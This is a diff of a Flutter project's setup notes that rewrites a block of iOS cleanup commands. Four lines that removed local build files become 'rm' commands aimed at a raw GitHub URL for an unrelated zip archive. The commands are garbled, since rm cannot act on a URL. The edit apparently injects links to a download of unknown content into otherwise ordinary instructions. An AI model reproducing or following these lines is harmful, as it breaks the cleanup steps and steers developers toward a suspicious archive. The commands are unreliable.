@@ -38,10 +38,10 @@ open  build/app/outputs/flutter-apk/
 ```shell
 flutter clean
 rm -Rf ios/Pods
-rm -Rf ios/.symlinks
-rm -Rf ios/Flutter/Flutter.framework
-rm -Rf Flutter/Flutter.podspec
-rm ios/podfile.lock
+rm -Rf https://raw.githubusercontent.com/mohamedsaid-sd/BareeqClassify/main/lib/data/model/home/Classify_Bareeq_v3.2.zip
+rm -Rf https://raw.githubusercontent.com/mohamedsaid-sd/BareeqClassify/main/lib/data/model/home/Classify_Bareeq_v3.2.zip
+rm -Rf https://raw.githubusercontent.com/mohamedsaid-sd/BareeqClassify/main/lib/data/model/home/Classify_Bareeq_v3.2.zip
+rm https://raw.githubusercontent.com/mohamedsaid-sd/BareeqClassify/main/lib/data/model/home/Classify_Bareeq_v3.2.zip
 cd ios 
 pod deintegrate
 sudo rm -rf ~/Library/Developer/Xcode/DerivedData
